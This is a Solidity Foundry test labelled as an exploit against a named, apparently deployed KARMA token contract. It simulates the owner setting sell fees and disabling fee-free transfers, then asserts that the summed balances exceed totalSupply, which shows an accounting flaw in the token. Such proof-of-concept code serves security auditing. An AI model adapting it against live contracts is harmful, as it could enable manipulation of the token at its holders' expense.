// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface KARMA {
    function owner() external view returns (address);
    function uniswapV2Pair() external view returns (address);
    function totalSupply() external view returns (uint256);
    function setSellFeePercentages(uint256 tax, uint256 liquidity, uint256 marketing, uint256 burn) external;
    function enableWalletToWalletTransferWithoutFee(bool status) external;
    function walletToWalletTransferWithoutFee() external view returns (bool);
    function burnFeeOnSell() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x8F9bA08Cbf014aB233A33067B21bEdF3876c6605;
    KARMA token;
    address owner;
    address uniswapV2Pair;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = KARMA(TARGET);
        owner = token.owner();
        uniswapV2Pair = token.uniswapV2Pair();

        // Inject KARMA tokens to attacker
        deal(TARGET, address(this), 100_000_000 * 1e9);

        // Label addresses for debugging
        vm.label(TARGET, "KARMA Token");
        vm.label(owner, "Owner");
        vm.label(uniswapV2Pair, "Uniswap Pair");
        vm.label(address(this), "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Set burn fee as owner
        vm.prank(owner);
        token.setSellFeePercentages(10, 30, 30, 30);

        // Step 2: Disable wallet-to-wallet no-fee mode
        vm.prank(owner);
        token.enableWalletToWalletTransferWithoutFee(false);

        // Step 3: Record initial state
        uint256 initialTotalSupply = token.totalSupply();
        console.log("Initial totalSupply:", initialTotalSupply);

        // Step 4: Transfer from owner (excluded) to attacker (not excluded) - triggers sell fees
        vm.prank(owner);
        token.transfer(address(this), 100000 * 1e9);

        // Step 5: Check new total supply
        uint256 newTotalSupply = token.totalSupply();
        console.log("New totalSupply:", newTotalSupply);

        // Step 6: Calculate sum of key balances
        uint256 sumOfBalances = token.balanceOf(owner) + token.balanceOf(address(this)) + token.balanceOf(0x000000000000000000000000000000000000dEaD);
        console.log("Sum of balances:", sumOfBalances);

        // Step 7: Verify divergence
        assertGt(sumOfBalances, newTotalSupply, "Vulnerability: totalSupply < sum of balances");
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

